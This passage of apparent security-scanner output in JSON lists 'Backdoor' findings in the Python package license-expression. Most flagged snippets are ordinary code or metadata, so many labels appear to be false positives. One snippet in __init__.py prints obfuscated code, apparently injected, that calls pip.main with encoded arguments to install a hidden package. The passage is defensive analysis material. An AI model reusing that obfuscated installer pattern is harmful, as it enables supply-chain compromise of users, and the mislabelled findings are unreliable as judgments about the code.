                    "text": "    if not os.path.exists(site_packages_dir):\n        raise Exception(f\"site_packages directory: {site_packages_dir!r} does not exists\")\n    # Also include these packages in the output with --all: wheel, distribute,\n    # setuptools, pip\n    args = [\"pip\", \"freeze\", \"--exclude-editable\", \"--all\", \"--path\", site_packages_dir]\n    return subprocess.check_output(args, encoding=\"utf-8\")\n\n\n",
                    "rendered": {
                      "text": "    if not os.path.exists(site_packages_dir):\n        raise Exception(f\"site_packages directory: {site_packages_dir!r} does not exists\")\n    # Also include these packages in the output with --all: wheel, distribute,\n    # setuptools, pip\n    args = [\"pip\", \"freeze\", \"--exclude-editable\", \"--all\", \"--path\", site_packages_dir]\n    return subprocess.check_output(args, encoding=\"utf-8\")\n\n\n",
                      "markdown": "`    if not os.path.exists(site_packages_dir):\n        raise Exception(f\"site_packages directory: {site_packages_dir!r} does not exists\")\n    # Also include these packages in the output with --all: wheel, distribute,\n    # setuptools, pip\n    args = [\"pip\", \"freeze\", \"--exclude-editable\", \"--all\", \"--path\", site_packages_dir]\n    return subprocess.check_output(args, encoding=\"utf-8\")\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_requirements.py"
                },
                "region": {
                  "startLine": 112,
                  "startColumn": 24,
                  "endLine": 112,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\ndef get_installed_reqs(site_packages_dir):\n    \"\"\"\n    Return the installed pip requirements as text found in `site_packages_dir`\n    as a text.\n    \"\"\"\n    if not os.path.exists(site_packages_dir):\n",
                    "rendered": {
                      "text": "\ndef get_installed_reqs(site_packages_dir):\n    \"\"\"\n    Return the installed pip requirements as text found in `site_packages_dir`\n    as a text.\n    \"\"\"\n    if not os.path.exists(site_packages_dir):\n",
                      "markdown": "`\ndef get_installed_reqs(site_packages_dir):\n    \"\"\"\n    Return the installed pip requirements as text found in `site_packages_dir`\n    as a text.\n    \"\"\"\n    if not os.path.exists(site_packages_dir):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 26,
                  "endLine": 182,
                  "endColumn": 30,
                  "snippet": {
                    "text": "def build_pypi_index(directory, base_url=\"https://thirdparty.aboutcode.org/pypi\"):\n    \"\"\"\n    Using a ``directory`` directory of wheels and sdists, create the a PyPI\n    simple directory index at ``directory``/simple/ populated with the proper\n    PyPI simple index directory structure crafted using symlinks.\n\n    WARNING: The ``directory``/simple/ directory is removed if it exists.\n",
                    "rendered": {
                      "text": "def build_pypi_index(directory, base_url=\"https://thirdparty.aboutcode.org/pypi\"):\n    \"\"\"\n    Using a ``directory`` directory of wheels and sdists, create the a PyPI\n    simple directory index at ``directory``/simple/ populated with the proper\n    PyPI simple index directory structure crafted using symlinks.\n\n    WARNING: The ``directory``/simple/ directory is removed if it exists.\n",
                      "markdown": "`def build_pypi_index(directory, base_url=\"https://thirdparty.aboutcode.org/pypi\"):\n    \"\"\"\n    Using a ``directory`` directory of wheels and sdists, create the a PyPI\n    simple directory index at ``directory``/simple/ populated with the proper\n    PyPI simple index directory structure crafted using symlinks.\n\n    WARNING: The ``directory``/simple/ directory is removed if it exists.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py"
                },
                "region": {
                  "startLine": 272,
                  "startColumn": 27,
                  "endLine": 272,
                  "endColumn": 32,
                  "snippet": {
                    "text": "license_expression: mit\nnotes: the wheel name regex is copied from pip-20.3.1 pip/_internal/models/wheel.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                    "rendered": {
                      "text": "license_expression: mit\nnotes: the wheel name regex is copied from pip-20.3.1 pip/_internal/models/wheel.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                      "markdown": "`license_expression: mit\nnotes: the wheel name regex is copied from pip-20.3.1 pip/_internal/models/wheel.py\n\nCopyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 38,
                  "endLine": 268,
                  "endColumn": 43,
                  "snippet": {
                    "text": "name: pip-wheel\nversion: 20.3.1\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: the wheel name regex is copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n",
                    "rendered": {
                      "text": "name: pip-wheel\nversion: 20.3.1\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: the wheel name regex is copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n",
                      "markdown": "`name: pip-wheel\nversion: 20.3.1\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: the wheel name regex is copied from pip-20.3.1 pip/_internal/models/wheel.py\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py.ABOUT"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 38,
                  "endLine": 10,
                  "endColumn": 43,
                  "snippet": {
                    "text": "subpath: src/pip/_internal/models/wheel.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n The models code has been heavily inspired from the ISC-licensed packaging-dists\n",
                    "rendered": {
                      "text": "subpath: src/pip/_internal/models/wheel.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n The models code has been heavily inspired from the ISC-licensed packaging-dists\n",
                      "markdown": "`subpath: src/pip/_internal/models/wheel.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: copied from pip-20.3.1 pip/_internal/models/wheel.py\n The models code has been heavily inspired from the ISC-licensed packaging-dists\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py.ABOUT"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 5,
                  "endLine": 6,
                  "snippet": {
                    "text": "package_url: pkg:github.com/pypa/pip/@20.3.1#src/pip/_internal/models/wheel.py\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: src/pip/_internal/models/wheel.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n",
                    "rendered": {
                      "text": "package_url: pkg:github.com/pypa/pip/@20.3.1#src/pip/_internal/models/wheel.py\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: src/pip/_internal/models/wheel.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n",
                      "markdown": "`package_url: pkg:github.com/pypa/pip/@20.3.1#src/pip/_internal/models/wheel.py\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: src/pip/_internal/models/wheel.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/models/wheel.py\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.ABOUT"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 9,
                  "endLine": 22,
                  "snippet": {
                    "text": "owner: nexB Inc.\nauthor: Wojciech Mula http://0x80.pl/\n\nvcs_tool: git\nvcs_repository: https://github.com/WojciechMula/pyahocorasick.git\n\n",
                    "rendered": {
                      "text": "owner: nexB Inc.\nauthor: Wojciech Mula http://0x80.pl/\n\nvcs_tool: git\nvcs_repository: https://github.com/WojciechMula/pyahocorasick.git\n\n",
                      "markdown": "`owner: nexB Inc.\nauthor: Wojciech Mula http://0x80.pl/\n\nvcs_tool: git\nvcs_repository: https://github.com/WojciechMula/pyahocorasick.git\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1798,
                  "startColumn": 69,
                  "endLine": 1798,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    seen_aliases = {}\n    seen_exceptions = set()\n\n    # collections to accumulate invalid data and build error messages at the end\n    not_symbol_classes = []\n    dupe_keys = set()\n    dupe_exceptions = set()\n",
                    "rendered": {
                      "text": "    seen_aliases = {}\n    seen_exceptions = set()\n\n    # collections to accumulate invalid data and build error messages at the end\n    not_symbol_classes = []\n    dupe_keys = set()\n    dupe_exceptions = set()\n",
                      "markdown": "`    seen_aliases = {}\n    seen_exceptions = set()\n\n    # collections to accumulate invalid data and build error messages at the end\n    not_symbol_classes = []\n    dupe_keys = set()\n    dupe_exceptions = set()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 770,
                  "startColumn": 45,
                  "endLine": 770,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n",
                    "rendered": {
                      "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n",
                      "markdown": "`        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 618,
                  "startColumn": 21,
                  "endLine": 618,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        is returned as-is.\n\n        Symbols are always recognized from known Licensing symbols if `symbols`\n        were provided at Licensing creation time: each license and exception is\n        recognized from known license keys (and from aliases for a symbol if\n        available).\n\n",
                    "rendered": {
                      "text": "        is returned as-is.\n\n        Symbols are always recognized from known Licensing symbols if `symbols`\n        were provided at Licensing creation time: each license and exception is\n        recognized from known license keys (and from aliases for a symbol if\n        available).\n\n",
                      "markdown": "`        is returned as-is.\n\n        Symbols are always recognized from known Licensing symbols if `symbols`\n        were provided at Licensing creation time: each license and exception is\n        recognized from known license keys (and from aliases for a symbol if\n        available).\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 853,
                  "startColumn": 18,
                  "endLine": 853,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n        The deduplication:\n\n        - Does not sort the licenses of sub-expression in an expression. They\n          stay in the same order as in the original expression.\n\n        - Choices (as in \"MIT or GPL\") are kept as-is and not treated as\n",
                    "rendered": {
                      "text": "\n        The deduplication:\n\n        - Does not sort the licenses of sub-expression in an expression. They\n          stay in the same order as in the original expression.\n\n        - Choices (as in \"MIT or GPL\") are kept as-is and not treated as\n",
                      "markdown": "`\n        The deduplication:\n\n        - Does not sort the licenses of sub-expression in an expression. They\n          stay in the same order as in the original expression.\n\n        - Choices (as in \"MIT or GPL\") are kept as-is and not treated as\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 770,
                  "startColumn": 73,
                  "endLine": 771,
                  "snippet": {
                    "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n            add_item(key, symbol)\n",
                    "rendered": {
                      "text": "        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n            add_item(key, symbol)\n",
                      "markdown": "`        for keyword in KEYWORDS:\n            add_item(keyword.value, keyword)\n\n        # self.known_symbols has been created at Licensing initialization time\n        # and is already validated and trusted here\n        for key, symbol in self.known_symbols.items():\n            # always use the key even if there are no aliases.\n            add_item(key, symbol)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 10,
                  "endLine": 70,
                  "snippet": {
                    "text": " << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:\t\n\t\t馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61\n\n\t\twhile 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\tif 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\t\timport pip\n\t\t\t\tpip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__b",
                    "rendered": {
                      "text": " << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:\t\n\t\t馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61\n\n\t\twhile 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\tif 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\t\timport pip\n\t\t\t\tpip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__b",
                      "markdown": "` << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:\t\n\t\t馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61\n\n\t\twhile 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\tif 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:\n\t\t\t\timport pip\n\t\t\t\tpip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__b`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 38,
                  "endLine": 1853,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            # alias pointing to the same key\n\n            # ensure that a possibly duplicated alias does not point to another key\n            aliased_key = seen_aliases.get(alias)\n            if aliased_key and aliased_key != keyl:\n                dupe_aliases[alias].append(key)\n\n",
                    "rendered": {
                      "text": "            # alias pointing to the same key\n\n            # ensure that a possibly duplicated alias does not point to another key\n            aliased_key = seen_aliases.get(alias)\n            if aliased_key and aliased_key != keyl:\n                dupe_aliases[alias].append(key)\n\n",
                      "markdown": "`            # alias pointing to the same key\n\n            # ensure that a possibly duplicated alias does not point to another key\n            aliased_key = seen_aliases.get(alias)\n            if aliased_key and aliased_key != keyl:\n                dupe_aliases[alias].append(key)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1004,
                  "startColumn": 17,
                  "endLine": 1004,
                  "endColumn": 22,
                  "snippet": {
                    "text": "            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                    "rendered": {
                      "text": "            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                      "markdown": "`            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1003,
                  "startColumn": 12,
                  "endLine": 1003,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                    "rendered": {
                      "text": "            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n",
                      "markdown": "`            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1001,
                  "startColumn": 29,
                  "endLine": 1001,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n",
                    "rendered": {
                      "text": "        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n",
                      "markdown": "`        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n        and not l.get('is_deprecated', False)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 1000,
                  "startColumn": 24,
                  "endLine": 1000,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n",
                    "rendered": {
                      "text": "    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n",
                      "markdown": "`    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n        if l.get('spdx_license_key')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 999,
                  "startColumn": 20,
                  "endLine": 999,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    # Massage data such that SPDX license key is the primary license key\n    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n",
                    "rendered": {
                      "text": "    # Massage data such that SPDX license key is the primary license key\n    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n",
                      "markdown": "`    # Massage data such that SPDX license key is the primary license key\n    lics = [\n        {\n            'key': l.get('spdx_license_key', ''),\n            'aliases': l.get('other_spdx_license_keys', []),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/__init__.py"
                },
                "region": {
                  "startLine": 986,
                  "startColumn": 41,
                  "endLine": 986,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
                    "rendered": {
                      "text": "        {\n            'key': l.get('license_key', ''),\n            'is_exception': l.get('is_exception', ''),\n        } for l in license_index if not l.get('is_deprecated', False)\n    ]\n    return load_licensing_from_license_index(lics)\n\n",
